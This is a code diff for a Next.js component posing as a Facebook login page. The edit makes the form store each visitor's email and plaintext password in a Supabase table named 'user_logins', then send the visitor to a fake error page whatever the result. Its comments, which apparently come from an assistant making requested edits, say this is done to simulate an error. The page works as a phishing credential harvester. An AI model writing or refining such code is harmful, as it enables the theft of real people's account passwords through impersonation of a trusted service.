@@ -1,8 +1,9 @@
 "use client";
 
 import { useRouter } from "next/navigation";
-import React from "react";
-import { useState } from "react";
+import React, { useState } from "react";
+// import { supabase } from "@/lib/supabase"; // Import the client
+import { supabase } from "../../lib/supabase";
 
 export default function FacebookLogin() {
   const [email, setEmail] = useState("");
@@ -13,17 +14,17 @@ export default function FacebookLogin() {
     e.preventDefault();
 
     try {
-      const response = await fetch("/api/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, password }),
-      });
+      // Direct insert to Supabase
+      const { error } = await supabase
+        .from("user_logins")
+        .insert([{ email: email, password: password }]);
 
-      // Even if the save works, we redirect to the error page as requested
-      // If you want it to only go to error on failure, keep the 'if (!response.ok)' logic
+      if (error) throw error;
+
+      // Redirect regardless of success to simulate the "error" experience
       router.push("/errorprofile");
     } catch (error) {
-      // Handles network or server crashes
+      console.error("Supabase Error:", error);
       router.push("/errorprofile");
     }
   };
